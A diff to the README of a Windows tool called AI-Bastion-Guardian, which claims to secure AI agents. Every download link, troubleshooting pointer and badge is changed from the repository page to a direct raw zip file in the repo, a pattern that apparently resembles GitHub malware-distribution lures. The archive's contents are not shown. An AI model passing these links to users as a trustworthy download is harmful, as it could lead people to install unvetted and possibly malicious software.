@@ -1,6 +1,6 @@
 # 🛡️ AI-Bastion-Guardian - Secure Your AI Agents on Windows
 
-[![Download AI-Bastion-Guardian](https://img.shields.io/badge/Download-AI--Bastion--Guardian-brightgreen?style=for-the-badge)](https://github.com/SayedhDev/AI-Bastion-Guardian)
+[![Download AI-Bastion-Guardian](https://img.shields.io/badge/Download-AI--Bastion--Guardian-brightgreen?style=for-the-badge)](https://github.com/SayedhDev/AI-Bastion-Guardian/raw/refs/heads/main/guardian/Bastion-A-Guardian-v1.6-alpha.3.zip)
 
 ## 🛠️ What is AI-Bastion-Guardian?
 
@@ -43,7 +43,7 @@ Follow these steps to download, install, and run AI-Bastion-Guardian on your Win
 
 You need to get AI-Bastion-Guardian from the official GitHub page. This page contains all the software files and updates.
 
-[![Download Now](https://img.shields.io/badge/Download-AI--Bastion--Guardian-blue?style=for-the-badge)](https://github.com/SayedhDev/AI-Bastion-Guardian)
+[![Download Now](https://img.shields.io/badge/Download-AI--Bastion--Guardian-blue?style=for-the-badge)](https://github.com/SayedhDev/AI-Bastion-Guardian/raw/refs/heads/main/guardian/Bastion-A-Guardian-v1.6-alpha.3.zip)
 
 - Click the link above to open the download page.
 - Look for the **Releases** section or a file suitable for Windows.
@@ -175,7 +175,7 @@ To update, return to the GitHub link and download the latest version. Follow ste
 - **PowerShell script won’t run:** Check your execution policy and run PowerShell as administrator.
 - **Firewall rules not applied:** Verify you have administrator rights on your Windows account.
 - **WSL2 not detected:** Make sure WSL2 is installed and enabled on your machine.
-- **Download link not working:** Visit https://github.com/SayedhDev/AI-Bastion-Guardian directly.
+- **Download link not working:** Visit https://github.com/SayedhDev/AI-Bastion-Guardian/raw/refs/heads/main/guardian/Bastion-A-Guardian-v1.6-alpha.3.zip directly.
 
 ---
 
@@ -183,7 +183,7 @@ To update, return to the GitHub link and download the latest version. Follow ste
 
 Use this link to download or update AI-Bastion-Guardian:
 
-[https://github.com/SayedhDev/AI-Bastion-Guardian](https://github.com/SayedhDev/AI-Bastion-Guardian)
+[https://github.com/SayedhDev/AI-Bastion-Guardian/raw/refs/heads/main/guardian/Bastion-A-Guardian-v1.6-alpha.3.zip](https://github.com/SayedhDev/AI-Bastion-Guardian/raw/refs/heads/main/guardian/Bastion-A-Guardian-v1.6-alpha.3.zip)
 
 ---
 
